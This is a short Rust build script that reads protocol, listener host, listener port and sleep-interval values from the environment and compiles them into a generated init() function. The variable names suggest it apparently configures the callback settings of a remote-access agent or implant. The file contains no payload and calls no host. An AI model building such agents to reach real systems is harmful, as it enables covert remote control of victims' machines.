use std::env;
use std::fs;
use std::path::Path;

fn main() {
    // Read environment variables for initiali settings
    let lproto = env::var_os("LPROTO").unwrap();
    let lhost = env::var_os("LHOST").unwrap();
    let lport = env::var_os("LPORT").unwrap();
    let sleep = env::var_os("SLEEP").unwrap();

    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("init.rs");

    fs::write(
        &dest_path,
        format!("pub fn init() -> (&'static str, &'static str, u16, u64) {}
            (\"{}\", \"{}\", {}, {})
        {}
        ",
        "{",
        lproto.into_string().unwrap(),
        lhost.into_string().unwrap(),
        lport.into_string().unwrap(),
        sleep.into_string().unwrap(),
        "}")).unwrap();

    println!("cargo:rerun-if-changed=build.rs");
}